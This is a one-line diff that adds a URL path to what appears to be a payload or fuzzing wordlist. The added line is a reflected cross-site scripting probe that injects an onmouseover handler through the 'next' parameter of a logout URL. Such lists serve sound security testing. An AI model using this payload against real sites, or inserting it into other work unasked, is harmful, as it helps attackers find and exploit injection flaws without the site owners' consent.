@@ -1,0 +1,1 @@
+/logout?next=%208%22onmouseover=%22alert(document.domain)
